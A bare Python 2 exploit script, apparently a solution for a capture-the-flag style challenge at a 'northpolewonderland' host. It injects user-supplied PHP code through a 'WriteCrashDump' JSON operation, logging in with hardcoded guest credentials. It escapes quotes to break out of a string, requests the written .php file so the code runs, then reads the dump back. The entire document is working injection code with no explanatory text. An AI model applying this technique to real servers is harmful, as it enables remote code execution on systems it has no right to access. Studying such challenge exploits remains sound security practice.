from __future__ import print_function
import os
import json
import requests

s = raw_input("php: ")
#s = "' . {} . '".format(s)
s = r"' . {} . '".format(s)

data = {
    "username":"guest",
    "password":"busyreindeer78",
    "operation":"WriteCrashDump",
    "data": s
}

h = {"Content-Type": "application/json"}

payload = json.dumps(data)

payload = payload.replace("'", r"\u0027")

print('sending', payload)
r = requests.post("http://ex.northpolewonderland.com/exception.php", headers=h, data=payload)

resp = r.json()
cd = resp['crashdump']

resp = requests.get('http://ex.northpolewonderland.com/docs/' + cd)
print(resp.content)
print ("")
nophp = cd.replace(".php", "")

print(nophp)

data = {
    "operation": "ReadCrashDump",
    "data":{ "crashdump": nophp },
}

r = requests.post("http://ex.northpolewonderland.com/exception.php", headers=h, data=json.dumps(data))

print(r)
print(r.content)
